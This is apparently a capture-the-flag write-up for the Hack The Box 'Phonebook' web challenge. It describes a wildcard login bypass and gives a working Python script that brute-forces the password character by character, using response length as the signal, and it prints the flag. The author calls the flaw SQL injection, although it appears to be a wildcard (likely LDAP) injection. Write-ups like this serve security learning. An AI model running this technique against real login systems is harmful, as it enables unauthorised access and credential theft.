# Phonebook

Immadiatly after loading up the page I tried simple SQL inejction. Here I found entering * in `username` and `password` gets us access to the site. Great! No flag however... So maybe the flag is the username or password! We can see on the page that there is liekly a user called `reece`, lets enter that as `username` and `*` as `password`. and... access! Perfect. So the password is probably the flag

I wrote a python script to bruteforce it. Usually I don't enjoy bruteforce challenges and I avoided this one because I thought it would be, but I'm happy with my script. It sends a post request with a randon ascii character + * and checks the content length of the response. I checked the length of a successful login and found it to be `2586`. Here's my code:

```python
import requests, time

headers = {'User-Agent': 'Mozilla/5.0'}

u = ''
i = 21

while i < 126:
    if i == 42 or i == 21:
        i += 1
        continue

    data = {
        'username': '*',
        'password': u + chr(i) + '*'
    }

    session = requests.Session()
    resp = session.post('http://IP:PORT/login',headers=headers,data=data)
    h = resp.headers
    #print(chr(i) + ": " + h['Content-Length'])

    if h['Content-Length'] == '2586':
        u += chr(i)
        i = 21
        print(u)
    
    i += 1

    time.sleep(0.02)
```

Running this will output the flag after a while: `HTB{d1rectory_h4xx0r_is_k00l}`